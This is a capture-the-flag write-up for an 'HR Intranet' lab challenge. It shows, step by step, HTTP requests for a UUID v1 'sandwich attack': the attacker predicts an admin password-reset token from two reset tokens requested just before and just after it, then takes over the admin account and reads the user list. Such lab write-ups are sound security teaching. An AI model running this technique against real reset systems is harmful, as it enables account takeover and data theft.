# Write-Up: HR Intranet

## Overview
The **HR Intranet** challenge allows participants to exploit a web application designed for a Human Resources department.
The challenge revolves around using a sandwich attack to gain unauthorized access to an admin account.

## Challenge Walkthrough

Creating an Account  
Start by creating a user account on the HR portal.

```http
PUT /login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{
   "username": "anyone",
   "password": "anyone"
}
```

Password Reset Links  
After account creation, request a password reset link for the just created user.

```http
POST /api/account/reset HTTP/1.1
Host: localhost:3000
Cookie: session_id=<session_id>
Content-Type: application/json

{
"name": "anyone"
}
```

Next, generate a reset link for the admin account.

```http
POST /api/account/reset HTTP/1.1
Host: localhost:3000
Cookie: session_id=<session_id>
Content-Type: application/json

{
"name": "admin"
}
```

Then, generate a second reset link for the created account.

```http
POST /api/account/reset HTTP/1.1
Host: localhost:3000
Cookie: session_id=<session_id>
Content-Type: application/json

{
"name": "anyone"
}
```

UUID v1 Exploitation  
The reset links are based on UUID v1, which is time-based.
By having two UUID links (generated one before and one after the reset link for the admin), all UUIDs in between can be calculated.
This kind of attack is known as [sandwich attack](https://book.hacktricks.xyz/pentesting-web/uuid-insecurities#sandwich-attack).


Finding the Admin Token:
Iterate through the calculated UUIDs to identify the one corresponding to the admin reset link. Once found, the admin password can be reset and the user list accessed.

```http
PUT /api/account/reset HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{
"token": "<admin_uuid>",
"password": "admin",
"confirmPassword": "admin"
}
```

Accessing the User List  
After resetting the admin password, log in as the admin and request the user list.

```http
GET /api/users HTTP/1.1
Host: localhost:3000
Cookie: session_id=<new_session_id>
```

The full exploit is available in the [exploit.py](exploit.py) file.